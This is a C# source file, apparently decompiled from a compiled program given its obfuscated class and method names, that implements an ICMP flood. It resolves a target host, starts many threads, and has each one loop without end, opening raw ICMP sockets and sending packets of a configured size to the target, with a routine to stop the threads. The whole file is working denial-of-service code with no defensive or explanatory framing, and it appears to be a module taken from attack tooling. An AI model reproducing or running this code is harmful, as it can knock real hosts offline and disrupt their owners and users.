using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class Class5
{
	private sealed class Class6
	{
		private IPEndPoint ipendPoint_0;

		private Socket[] socket_0;

		private int int_0;

		private int int_1;

		public Class6(IPEndPoint ipendPoint_1, int int_2, int int_3)
		{
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_2;
			int_1 = int_3;
		}

		public void method_0()
		{
			while (true)
			{
				byte[] buffer = new byte[int_1];
				try
				{
					socket_0 = new Socket[int_0];
					for (int i = 0; i < int_0; i++)
					{
						socket_0[i] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
						socket_0[i].Blocking = false;
						socket_0[i].SendTo(buffer, ipendPoint_0);
					}
					Thread.Sleep(100);
					for (int i = 0; i < int_0; i++)
					{
						if (socket_0[i].Connected)
						{
							socket_0[i].Disconnect(reuseSocket: false);
						}
						socket_0[i].Close();
						socket_0[i] = null;
					}
					socket_0 = null;
				}
				catch
				{
					for (int i = 0; i < int_0; i++)
					{
						try
						{
							if (socket_0[i].Connected)
							{
								socket_0[i].Disconnect(reuseSocket: false);
							}
							socket_0[i].Close();
							socket_0[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	private static Class6[] class6_0;

	private static IPEndPoint ipendPoint_0;

	public static string string_0;

	public static int int_0;

	public static int int_1;

	public static int int_2;

	public static int int_3;

	public static void smethod_0()
	{
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).AddressList[0], int_0);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), int_0);
		}
		thread_0 = new Thread[int_1];
		threadStart_0 = new ThreadStart[int_1];
		class6_0 = new Class6[int_1];
		for (int i = 0; i < int_1; i++)
		{
			class6_0[i] = new Class6(ipendPoint_0, int_2, int_3);
			threadStart_0[i] = class6_0[i].method_0;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < int_1; i++)
		{
			try
			{
				thread_0[i].Abort();
				thread_0[i] = null;
				threadStart_0[i] = null;
				class6_0[i] = null;
			}
			catch
			{
			}
		}
	}
}